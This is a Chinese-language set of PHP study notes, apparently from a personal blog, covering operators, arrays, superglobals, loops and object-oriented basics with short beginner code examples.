<h4 id="数组运算符"><a href="#数组运算符" class="headerlink" title="数组运算符"></a>数组运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">x + y</td>
<td align="left">集合</td>
<td align="left">x 和 y 的集合</td>
</tr>
<tr>
<td align="left">x &#x3D;&#x3D; y</td>
<td align="left">相等</td>
<td align="left">如果 x 和 y 具有相同的键&#x2F;值对，则返回 true</td>
</tr>
<tr>
<td align="left">x &#x3D;&#x3D;&#x3D; y</td>
<td align="left">恒等</td>
<td align="left">如果 x 和 y 具有相同的键&#x2F;值对，且顺序相同类型相同，则返回 true</td>
</tr>
<tr>
<td align="left">x !&#x3D; y</td>
<td align="left">不相等</td>
<td align="left">如果 x 不等于 y，则返回 true</td>
</tr>
<tr>
<td align="left">x &lt;&gt; y</td>
<td align="left">不相等</td>
<td align="left">如果 x 不等于 y，则返回 true</td>
</tr>
<tr>
<td align="left">x !&#x3D;&#x3D; y</td>
<td align="left">不恒等</td>
<td align="left">如果 x 不等于 y，则返回 true</td>
</tr>
</tbody></table>
<h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(expr1) ? (expr2) : (expr3) </span><br></pre></td></tr></table></figure>

<p>以下实例中通过判断 $_GET 请求中含有 user 值，如果有返回 $_GET[‘user’]，否则返回 nobody：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 普通写法</span><br><span class="line">$username = isset($_GET[&#x27;user&#x27;]) ? $_GET[&#x27;user&#x27;] : &#x27;nobody&#x27;;</span><br><span class="line">echo $username, PHP_EOL;</span><br><span class="line"> </span><br><span class="line">// PHP 5.3+ 版本写法</span><br><span class="line">$username = $_GET[&#x27;user&#x27;] ?: &#x27;nobody&#x27;;</span><br><span class="line">echo $username, PHP_EOL;</span><br><span class="line"></span><br><span class="line">// PHP 7+ 版本写法</span><br><span class="line">$username = $_GET[&#x27;user&#x27;] ?? &#x27;nobody&#x27;;</span><br><span class="line">echo $username, PHP_EOL;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>注：<strong>PHP_EOL</strong> 是一个换行符</p>
<h4 id="组合比较符-PHP7"><a href="#组合比较符-PHP7" class="headerlink" title="组合比较符(PHP7+)"></a>组合比较符(PHP7+)</h4><p>符号为 **&lt;&#x3D;&gt;**。组合比较运算符可以轻松实现两个变量的比较，不仅限于数值类数据的比较</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$c = $a &lt;=&gt; $b;</span><br></pre></td></tr></table></figure>

<p>如果 <strong>$a &gt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>1</strong>。</p>
<p>如果 <strong>$a &#x3D;&#x3D; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>0</strong>。</p>
<p>如果 <strong>$a &lt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>-1</strong>。</p>
<h4 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h4><p>下表按照优先级从高到低列出了运算符</p>
<p><strong>说明</strong>：左 ＝ 从左到右，右 ＝ 从右到左</p>
<table>
<thead>
<tr>
<th align="left">结合方向</th>
<th align="left">运算符</th>
<th align="left">附加信息</th>
</tr>
</thead>
<tbody><tr>
<td align="left">无</td>
<td align="left">clone new</td>
<td align="left">clone 和 new</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">[</td>
<td align="left">array()</td>
</tr>
<tr>
<td align="left">右</td>
<td align="left">++ – ~ (int) (float) (string) (array) (object) (bool) @</td>
<td align="left">类型和递增／递减</td>
</tr>
<tr>
<td align="left">无</td>
<td align="left">instanceof</td>
<td align="left">类型</td>
</tr>
<tr>
<td align="left">右</td>
<td align="left">!</td>
<td align="left">逻辑运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">* &#x2F; %</td>
<td align="left">算术运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">+ – .</td>
<td align="left">算术运算符和字符串运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">&lt;&lt; &gt;&gt;</td>
<td align="left">位运算符</td>
</tr>
<tr>
<td align="left">无</td>
<td align="left">&#x3D;&#x3D; !&#x3D; &#x3D;&#x3D;&#x3D; !&#x3D;&#x3D; &lt;&gt;</td>
<td align="left">比较运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">&amp;</td>
<td align="left">位运算符和引用</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">^</td>
<td align="left">位运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">|</td>
<td align="left">位运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">&amp;&amp;</td>
<td align="left">逻辑运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">||</td>
<td align="left">逻辑运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">? :</td>
<td align="left">三元运算符</td>
</tr>
<tr>
<td align="left">右</td>
<td align="left">&#x3D; +&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; .&#x3D; %&#x3D; &amp;&#x3D; |&#x3D; ^&#x3D; &lt;&lt;&#x3D; &gt;&gt;&#x3D; &#x3D;&gt;</td>
<td align="left">赋值运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">and</td>
<td align="left">逻辑运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">xor</td>
<td align="left">逻辑运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">or</td>
<td align="left">逻辑运算符</td>
</tr>
<tr>
<td align="left">左</td>
<td align="left">,</td>
<td align="left">多处用到</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 优先级： &amp;&amp;  &gt;  =  &gt;  and</span><br><span class="line">// 优先级： ||  &gt;  =  &gt;  or</span><br><span class="line"> </span><br><span class="line">$a = 3;</span><br><span class="line">$b = false;</span><br><span class="line">$c = $a or $b;</span><br><span class="line">var_dump($c);          // 这里的 $c 为 int 值3，而不是 boolean 值 true；输出int(3)</span><br><span class="line">$d = $a || $b;</span><br><span class="line">var_dump($d);          //这里的 $d 就是 boolean 值 true ;输出bool(true)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-条件语句"><a href="#PHP-条件语句" class="headerlink" title="PHP 条件语句"></a>PHP 条件语句</h3><p><strong>if 语句</strong> - 在条件成立时执行代码</p>
<p><strong>if…else 语句</strong> - 在条件成立时执行一块代码，条件不成立时执行另一块代码</p>
<p><strong>if…elseif….else 语句</strong> - 在若干条件之一成立时执行一个代码块</p>
<p><strong>switch 语句</strong> - 在若干条件之一成立时执行一个代码块</p>
<h3 id="PHP数组-1"><a href="#PHP数组-1" class="headerlink" title="PHP数组"></a>PHP数组</h3><p>在 PHP 中，array() 函数用于创建数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">echo &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h4><p>count() 函数用于返回数组的长度（元素的数量）</p>
<h4 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组"></a>遍历数值数组</h4><p>遍历并打印数值数组中的所有值，您可以使用 for 循环</p>
<h4 id="PHP-关联数组"><a href="#PHP-关联数组" class="headerlink" title="PHP 关联数组"></a>PHP 关联数组</h4><p>关联数组是使用分配给数组的指定的键的数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</span><br><span class="line">echo &quot;Peter is &quot; . $age[&#x27;Peter&#x27;] . &quot; years old.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h4><p>遍历并打印关联数组中的所有值，您可以使用 foreach 循环</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</span><br><span class="line"> </span><br><span class="line">foreach($age as $x=&gt;$x_value)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!IMPORTANT]</p>
<h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><p>在 PHP 中，<code>foreach</code> 循环是一种专门用于遍历数组或对象的结构</p>
<p>相比于 <code>for</code> 或 <code>while</code> 循环，<code>foreach</code> 能更自然地处理复杂数据结构，如关联数组或对象</p>
<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><h5 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach ($array as $value) &#123;</span><br><span class="line">    // 循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**<code>$array</code>**：需要遍历的数组。</p>
<p>**<code>$value</code>**：当前循环中数组的值。</p>
<h5 id="遍历数组的键值对"><a href="#遍历数组的键值对" class="headerlink" title="遍历数组的键值对"></a>遍历数组的键值对</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach ($array as $key =&gt; $value) &#123;</span><br><span class="line">    // 循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**<code>$key</code>**：当前元素的键。</p>
<p>**<code>$value</code>**：当前元素的值。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><h5 id="简单数组"><a href="#简单数组" class="headerlink" title="简单数组"></a>简单数组</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x=array(&quot;Google&quot;,&quot;Runoob&quot;,&quot;Taobao&quot;);</span><br><span class="line">foreach ($x as $value)</span><br><span class="line">&#123;</span><br><span class="line">    echo $value . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x=array(1=&gt;&quot;Google&quot;, 2=&gt;&quot;Runoob&quot;, 3=&gt;&quot;Taobao&quot;);</span><br><span class="line">foreach ($x as $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;key  为 &quot; . $key . &quot;，对应的 value 为 &quot;. $value . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="嵌套数组"><a href="#嵌套数组" class="headerlink" title="嵌套数组"></a>嵌套数组</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$users = [</span><br><span class="line">    [&quot;name&quot; =&gt; &quot;John&quot;, &quot;age&quot; =&gt; 30],</span><br><span class="line">    [&quot;name&quot; =&gt; &quot;Jane&quot;, &quot;age&quot; =&gt; 25],</span><br><span class="line">    [&quot;name&quot; =&gt; &quot;Doe&quot;, &quot;age&quot; =&gt; 40]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">foreach ($users as $user) &#123;</span><br><span class="line">    foreach ($user as $key =&gt; $value) &#123;</span><br><span class="line">        echo &quot;$key: $value, &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="遍历对象"><a href="#遍历对象" class="headerlink" title="遍历对象"></a>遍历对象</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Car &#123;</span><br><span class="line">    public $brand = &quot;Toyota&quot;;</span><br><span class="line">    public $model = &quot;Corolla&quot;;</span><br><span class="line">    public $year = 2022;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$car = new Car();</span><br><span class="line"></span><br><span class="line">foreach ($car as $property =&gt; $value) &#123;</span><br><span class="line">    echo &quot;$property: $value\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


</blockquote>
<h4 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h4><p>数组中的元素可以按字母或数字顺序进行降序或升序排列</p>
<h5 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h5><p>对数组进行升序排列</p>
<h5 id="rsort"><a href="#rsort" class="headerlink" title="rsort()"></a>rsort()</h5><p>对数组进行降序排列</p>
<h5 id="asort"><a href="#asort" class="headerlink" title="asort()"></a>asort()</h5><p>根据<strong>数组的值</strong>，对关联数组进行升序排列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</span><br><span class="line">asort($age);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="arsort"><a href="#arsort" class="headerlink" title="arsort()"></a>arsort()</h5><p>根据<strong>数组的值</strong>，对关联数组进行降序排列</p>
<h5 id="ksort"><a href="#ksort" class="headerlink" title="ksort()"></a>ksort()</h5><p>根据<strong>数组的键</strong>，对关联数组进行升序排列</p>
<h5 id="krsort"><a href="#krsort" class="headerlink" title="krsort()"></a>krsort()</h5><p>根据<strong>数组的键</strong>，对关联数组进行降序排列</p>
<h3 id="PHP-超级全局变量"><a href="#PHP-超级全局变量" class="headerlink" title="PHP 超级全局变量"></a>PHP 超级全局变量</h3><p>超级全局变量在一个脚本的全部作用域中都可用</p>
<p>PHP 超级全局变量列表:</p>
<ul>
<li>$GLOBALS</li>
<li>$_SERVER</li>
<li>$_REQUEST</li>
<li>$_POST</li>
<li>$_GET</li>
<li>$_FILES</li>
<li>$_ENV</li>
<li>$_COOKIE</li>
<li>$_SESSION</li>
</ul>
<h4 id="PHP-GLOBALS"><a href="#PHP-GLOBALS" class="headerlink" title="PHP $GLOBALS"></a>PHP $GLOBALS</h4><p>$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<h4 id="PHP-SERVER"><a href="#PHP-SERVER" class="headerlink" title="PHP $_SERVER"></a>PHP $_SERVER</h4><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。</p>
<h4 id="PHP-REQUEST"><a href="#PHP-REQUEST" class="headerlink" title="PHP $_REQUEST"></a>PHP $_REQUEST</h4><p>PHP $_REQUEST 用于收集HTML表单提交的数据</p>
<h4 id="PHP-POST"><a href="#PHP-POST" class="headerlink" title="PHP $_POST"></a>PHP $_POST</h4><p>PHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”post”。</p>
<h4 id="PHP-GET"><a href="#PHP-GET" class="headerlink" title="PHP $_GET"></a>PHP $_GET</h4><p>PHP $_GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”get”</p>
<p>$_GET 也可以收集URL中发送的数据</p>
<p>假定我们有一个包含参数的超链接HTML页面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;test_get.php?subject=PHP&amp;web=runoob.com&quot;&gt;Test $GET&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>当用户点击链接 “Test $GET”, 参数 “subject” 和 “web” 将发送至”test_get.php”,你可以在 “test_get.php” 文件中使用 $_GET 变量来获取这些数据。以下为 “test_get.php” 文件的代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt;  </span><br><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">echo &quot;Study &quot; . $_GET[&#x27;subject&#x27;] . &quot; @ &quot; . $_GET[&#x27;web&#x27;]; </span><br><span class="line">?&gt;  </span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PHP循环"><a href="#PHP循环" class="headerlink" title="PHP循环"></a>PHP循环</h3><ul>
<li><strong>while</strong> - 只要指定的条件成立，则循环执行代码块</li>
<li><strong>do…while</strong> - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li>
<li><strong>for</strong> - 循环执行代码块指定的次数</li>
<li><strong>foreach</strong> - 根据数组中每个元素来循环代码块</li>
</ul>
<h3 id="PHP面向对象（难理解）"><a href="#PHP面向对象（难理解）" class="headerlink" title="PHP面向对象（难理解）"></a>PHP面向对象（难理解）</h3><p>面向对象编程强调数据的封装、继承、多态和动态绑定等特性，使得程序具有更好的可扩展性、可维护性和可重用性</p>
<h4 id="PHP类定义"><a href="#PHP类定义" class="headerlink" title="PHP类定义"></a>PHP类定义</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class phpClass &#123;</span><br><span class="line">  var $var1;</span><br><span class="line">  var $var2 = &quot;constant string&quot;;</span><br><span class="line">  </span><br><span class="line">  function myfunc ($arg1, $arg2) &#123;</span><br><span class="line">     [..]</span><br><span class="line">  &#125;</span><br><span class="line">  [..]</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>类使用 <strong>class</strong> 关键字后加上类名定义，类名后的一对大括号({})内可以定义变量和方法，类的变量使用 <strong>var</strong> 来声明, 变量也可以初始化值</p>
<blockquote>
<p>[!CAUTION]</p>
<h4 id="类，对象，当前对象的关系"><a href="#类，对象，当前对象的关系" class="headerlink" title="类，对象，当前对象的关系"></a>类，对象，当前对象的关系</h4><p><strong>类</strong> 是一种模板或蓝图。比如，<code>class Car &#123; ... &#125;</code> 是一个汽车的模板。</p>
<p><strong>对象</strong> 是从类生成的具体实例。比如，<code>$car1 = new Car();</code> 是一辆具体的汽车。</p>
<p><strong>当前对象</strong> 是某一时刻你正在操作的对象。如果你正在对 <code>$car1</code> 调用方法，那么 <code>$car1</code> 就是当前对象，<code>$this</code> 就是指当前对象，在方法里用 <code>$this</code> 来访问或修改它的属性和方法。</p>
</blockquote>
<h4 id="PHP-中创建对象"><a href="#PHP-中创建对象" class="headerlink" title="PHP 中创建对象"></a>PHP 中创建对象</h4><p>类创建后，我们可以使用 <strong>new</strong> 运算符来实例化该类的对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Site &#123;</span><br><span class="line">  /* 成员变量 */</span><br><span class="line">  var $url;</span><br><span class="line">  var $title;</span><br><span class="line">  </span><br><span class="line">  /* 成员函数 */</span><br><span class="line">  function setUrl($par)&#123;</span><br><span class="line">     $this-&gt;url = $par;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function getUrl()&#123;</span><br><span class="line">     echo $this-&gt;url . PHP_EOL;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function setTitle($par)&#123;</span><br><span class="line">     $this-&gt;title = $par;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function getTitle()&#123;</span><br><span class="line">     echo $this-&gt;title . PHP_EOL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$runoob = new Site;</span><br><span class="line">$taobao = new Site;</span><br><span class="line">$google = new Site;</span><br><span class="line"></span><br><span class="line">// 调用成员函数，设置标题和URL</span><br><span class="line">$runoob-&gt;setTitle( &quot;菜鸟教程&quot; );</span><br><span class="line">$taobao-&gt;setTitle( &quot;淘宝&quot; );</span><br><span class="line">$google-&gt;setTitle( &quot;Google 搜索&quot; );</span><br><span class="line"></span><br><span class="line">$runoob-&gt;setUrl( &#x27;www.runoob.com&#x27; );</span><br><span class="line">$taobao-&gt;setUrl( &#x27;www.taobao.com&#x27; );</span><br><span class="line">$google-&gt;setUrl( &#x27;www.google.com&#x27; );</span><br><span class="line"></span><br><span class="line">// 调用成员函数，获取标题和URL</span><br><span class="line">$runoob-&gt;getTitle();</span><br><span class="line">$taobao-&gt;getTitle();</span><br><span class="line">$google-&gt;getTitle();</span><br><span class="line"></span><br><span class="line">$runoob-&gt;getUrl();</span><br><span class="line">$taobao-&gt;getUrl();</span><br><span class="line">$google-&gt;getUrl();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="析构函数（可拓展）"><a href="#析构函数（可拓展）" class="headerlink" title="析构函数（可拓展）"></a>析构函数（可拓展）</h4><p>析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __destruct ( void )</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class MyDestructableClass &#123;</span><br><span class="line">   function __construct() &#123;</span><br><span class="line">       print &quot;构造函数\n&quot;;</span><br><span class="line">       $this-&gt;name = &quot;MyDestructableClass&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function __destruct() &#123;</span><br><span class="line">       print &quot;销毁 &quot; . $this-&gt;name . &quot;\n&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new MyDestructableClass();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">销毁 MyDestructableClass</span><br></pre></td></tr></table></figure>

<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>PHP 使用关键字 <strong>extends</strong> 来继承一个类，PHP 不支持多继承</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Child extends Parent &#123;</span><br><span class="line">   // 代码部分</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例中 Child_Site 类继承了 Site 类，并扩展了功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// 子类扩展站点类别</span><br><span class="line">class Child_Site extends Site &#123;</span><br><span class="line">   var $category;</span><br><span class="line"></span><br><span class="line">    function setCate($par)&#123;</span><br><span class="line">        $this-&gt;category = $par;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function getCate()&#123;</span><br><span class="line">        echo $this-&gt;category . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h4><p>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写</p>
<p>实例中重写了 getUrl 与 getTitle 方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getUrl() &#123;</span><br><span class="line">   echo $this-&gt;url . PHP_EOL;</span><br><span class="line">   return $this-&gt;url;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">function getTitle()&#123;</span><br><span class="line">   echo $this-&gt;title . PHP_EOL;</span><br><span class="line">   return $this-&gt;title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4><p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的</p>
<ul>
<li><strong>public（公有）：</strong>公有的类成员可以在任何地方被访问。</li>
<li><strong>protected（受保护）：</strong>受保护的类成员则可以被其自身以及其子类和父类访问。</li>
<li><strong>private（私有）：</strong>私有的类成员则只能被其定义所在的类访问。</li>
</ul>
<blockquote>
<p>[!WARNING]</p>
<p><code>protected</code> 属性是受保护的，只能在类的内部或子类中访问。<strong>类的外部无法直接访问</strong></p>
<p><code>private</code> 属性是私有的，只能在定义它的类内部访问。即使<strong>在子类中也无法直接访问</strong></p>
<p>可以对 public 和 protected 进行重定义，但 private 而不能</p>
</blockquote>
<h5 id="属性的访问控制"><a href="#属性的访问控制" class="headerlink" title="属性的访问控制"></a>属性的访问控制</h5><p>类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有</p>
<h5 id="方法的访问控制"><a href="#方法的访问控制" class="headerlink" title="方法的访问控制"></a>方法的访问控制</h5><p>类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有</p>
<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容</p>
<p>接口是通过 <strong>interface</strong> 关键字来定义的</p>
<p>接口中定义的所有方法都必须是公有</p>
<p>要实现一个接口，使用 <strong>implements</strong> 操作符</p>
<p>类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 声明一个&#x27;iTemplate&#x27;接口</span><br><span class="line">interface iTemplate</span><br><span class="line">&#123;</span><br><span class="line">    public function setVariable($name, $var);</span><br><span class="line">    public function getHtml($template);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 实现接口</span><br><span class="line">class Template implements iTemplate</span><br><span class="line">&#123;</span><br><span class="line">    private $vars = array();</span><br><span class="line">  </span><br><span class="line">    public function setVariable($name, $var)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;vars[$name] = $var;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    public function getHtml($template)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach($this-&gt;vars as $name =&gt; $value) &#123;</span><br><span class="line">            $template = str_replace(&#x27;&#123;&#x27; . $name . &#x27;&#125;&#x27;, $value, $template);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        return $template;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><p>动态访问类常量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class MyClass &#123;</span><br><span class="line">    const MY_CONSTANT = &quot;Hello, World!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 动态类名</span><br><span class="line">$classname = &quot;MyClass&quot;;</span><br><span class="line"></span><br><span class="line">// 使用动态类名访问常量</span><br><span class="line">echo $classname::MY_CONSTANT; // 输出: Hello, World!</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p>任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的</p>
<p>定义为抽象的类不能被实例化。</p>
<p>被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现</p>
<h4 id="Static-关键字"><a href="#Static-关键字" class="headerlink" title="Static 关键字"></a>Static 关键字</h4><p>声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。</p>
<p>静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Foo &#123;</span><br><span class="line">  public static $my_static = &#x27;foo&#x27;;</span><br><span class="line">  </span><br><span class="line">  public function staticValue() &#123;</span><br><span class="line">     return self::$my_static;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print Foo::$my_static . PHP_EOL;</span><br><span class="line"></span><br><span class="line">$foo = new Foo();</span><br><span class="line">print $foo-&gt;staticValue() . PHP_EOL;</span><br><span class="line">?&gt;   </span><br></pre></td></tr></table></figure>

<h4 id="Final-关键字"><a href="#Final-关键字" class="headerlink" title="Final 关键字"></a>Final 关键字</h4><p>如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承</p>
<h4 id="调用父类构造方法"><a href="#调用父类构造方法" class="headerlink" title="调用父类构造方法"></a>调用父类构造方法</h4><p>PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 <strong>parent::__construct()</strong></p>
